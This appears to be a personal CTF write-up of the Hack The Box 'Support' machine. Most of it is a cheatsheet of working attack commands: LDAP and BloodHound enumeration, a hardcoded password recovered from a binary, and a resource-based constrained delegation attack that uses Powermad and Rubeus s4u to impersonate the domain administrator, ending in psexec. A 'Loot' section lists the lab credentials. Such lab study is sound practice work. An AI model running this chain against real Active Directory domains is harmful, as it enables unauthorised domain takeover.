---
description: Guided Mode + IppSec
---

# Support \[Easy]

## Report

Fill

{% embed url="https://www.hackingarticles.in/a-detailed-guide-on-rubeus/" %}

## Cheatsheet

```
smbclient enumeration (List shares and files available)
scp -r support jeanv@192.168.68.110:/C:/Users/jeanv/Downloads
dnspy.exe (Windows .NET Disassembler)
netexec smb support.htb -u ldap -p nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz (Check if creds valid)
Get hardcoded password for 'ldap' from UserInfo.exe by checking the functions and XOR encrypted cipher with key
neolog4j console
bloodhound-python -c ALL -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -ns 10.10.11.174
bloodhound
evil-winrm -i support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' 

ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" | grep "User" -B 20 -A 20
ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" '(&(objectClass=Person)(cn=support))'| grep "User" -A 20 -B 20

evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
upload /usr/share/windows-resources/Powermad/Powermad.ps1
upload /usr/share/windows-resources/Rubeus.exe

Bloodhound show new vector
. ./PowerView.ps1
. ./Powermad.ps1

New-MachineAccount -MachineAccount 0xdfFakeComputer -Password $(ConvertTo-SecureString '0xdf0xdf123' -AsPlainText -Force)
[+] Machine account 0xdfFakeComputer added
$fakesid = Get-DomainComputer 0xdfFakeComputer | select -expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

$RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
$Descriptor.DiscretionaryAcl

.\Rubeus.exe hash /password:0xdf0xdf123 /user:0xdfFakeComputer /domain:support.htb
.\Rubeus.exe s4u /user:0xdfFakeComputer$ /rc4:B1809AB221A7E1F4545BD9E24E49D5F4 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt
.\Rubeus.exe klist

base64 -d ticket.kirbi.b64 > ticket.kirbi
./ticketConverter.py ~/htb/support/ticket.kirbi ~/htb/support/ticket.ccache
export KRB5CCNAME=/home/jtripz/htb/support/ticket.ccache; python3 psexec.py support.htb/administrator@dc.support.htb -k -no-pass


#WHY DID THIS NOT WORK 
New-MachineAccount -MachineAccount attackersystem71 -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
$compsid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
$sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($compsid))"
$sdbytes = New-Object byte[] ($sd.BinaryLength)
$sd.GetBinaryForm($sdbytes, 0)
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sdbytes}
.\Rubeus.exe s4u /user:attackersystem71$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/dc.support.htb /ptt

```

## Loot

### Creds

ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

support:Ironside47pleasure40Watchful

### Proof

<figure><img src="../../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

<div align="left"><figure><img src="../../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure></div>

## In-Game Pitch Notes

None, 0xdf and htb guided mode

## Lessons Learnt

windows and kali vm mutual comms&#x20;

smbclient and netexec initial enum

dnspy debugging and reveng password for ldap

ldapsearch filters and structure

bloodhound node and group analysis
